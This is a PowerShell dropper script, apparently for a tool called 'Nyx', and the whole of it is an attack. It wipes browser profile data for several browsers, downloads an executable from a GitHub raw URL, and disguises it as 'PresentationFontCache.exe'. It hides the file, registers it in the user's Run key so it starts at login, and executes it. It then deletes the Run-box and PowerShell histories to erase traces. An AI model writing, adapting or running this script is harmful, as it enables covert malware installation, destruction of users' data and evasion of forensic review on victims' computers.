# Nyx - 2D4SR6CP

# Remove browser data
Remove-Item "$env:LOCALAPPDATA\Microsoft\Internet Explorer\*" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Recurse -Force
Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*" -Recurse -Force
Remove-Item "$env:APPDATA\Opera Software\Opera Stable\*" -Recurse -Force

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "2D4SR6CP" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/2D4SR6CP/2D4SR6CP.exe -OutFile "$env:APPDATA\2D4SR6CP\2D4SR6CP.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\2D4SR6CP\2D4SR6CP.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\2D4SR6CP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "2D4SR6CP" `
-Value "$env:APPDATA\2D4SR6CP\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\2D4SR6CP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
